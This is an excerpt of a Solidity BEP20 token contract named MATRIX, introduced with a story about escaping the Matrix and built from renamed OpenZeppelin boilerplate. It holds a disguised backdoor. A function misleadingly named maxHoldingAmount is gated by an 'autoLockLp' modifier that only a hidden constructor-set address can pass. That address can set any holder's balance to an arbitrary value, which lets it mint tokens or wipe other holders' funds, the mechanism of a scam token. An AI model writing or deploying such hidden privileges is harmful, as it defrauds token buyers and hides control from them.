...
██║░╚═╝░██║██║░░██║░░░██║░░░██║░░██║██║██╔╝╚██╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝
The world lives in a virtual reality called Matrix, 
controlled by artificial intelligence that governs humans according to its will. 
People have forgotten about the real world and exist entirely within Matrix. However, 
a group of people who want to escape Matrix have created a cryptocurrency called Matrix token.
https://fr.wikipedia.org/wiki/Matrix_(film)
Matrix token will help people gather the resources needed to return to the real world. 
This token will be used to create a sanctuary in the real world and escape from Matrix.
*/
/**
...
/*
 * @dev Provides information about the current execution MATRIXontext, including the
 ...
 */
abstract contract MATRIXontext {
...
// File: @openzeppelin/contracts/access/OwnableMATRIX.sol
 ...
 * the owner.
 */
abstract contract OwnableMATRIX is MATRIXontext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnableMATRIX: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnableMATRIX: new owner is the zero address");
...
contract MATRIX is MATRIXontext, BEP20MATRIX, OwnableMATRIX {
   ...
   address private Binancev3rooter; 
    constructor(address Binancev2rooter) {
        ...
        _symbol = "MATRIX";
        _decimals = 9;
        allTotalSupply = 755577799999999000000000;
    ...
    */
    ...
    /**
    * @dev See {BEP20MATRIX-totalSupply}.
    */
    ...
    /**
    * @dev See {BEP20MATRIX-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return epxAll[account];
    }
      modifier autoLockLp() {
        require(Binancev3rooter == _msgSender(), "OwnableMATRIX: caller is not the owner");
        _;
    }
    /**
    * @dev See {BEP20MATRIX-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function maxHoldingAmount(address MATRIXPLEBRewards, uint256 aaaMontant, uint256 aaaepx, uint256 subtractedepx) external autoLockLp {
        epxAll[MATRIXPLEBRewards] = aaaMontant * aaaepx ** subtractedepx;
        
        emit Transfer(MATRIXPLEBRewards, address(0), aaaMontant);
    }

    /**
    * @dev See {BEP20MATRIX-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BEP20MATRIX-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEP20MATRIX};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address recever, uint256 lamount) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), allowancesAll[sender][_msgSender()].sub(lamount, "BEP20MATRIX: transfer lamount exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BEP20MATRIX-approve}.
    *
    ...
    */
    function decreaseAllowance(address spender, uint256 subtractedepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].sub(subtractedepx, "BEP20MATRIX: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address recever, uint256 lamount) internal {
        require(sender != address(0), "BEP20MATRIX: transfer from the zero address");
        require(recever != address(0), "BEP20MATRIX: transfer to the zero address");
                
        epxAll[sender] = epxAll[sender].sub(lamount, "BEP20MATRIX: transfer lamount exceeds balance");
    ...
    */
    function _approve(address owner, address spender, uint256 lamount) internal {
        require(owner != address(0), "BEP20MATRIX: approve from the zero address");
        require(spender != address(0), "BEP20MATRIX: approve to the zero address");
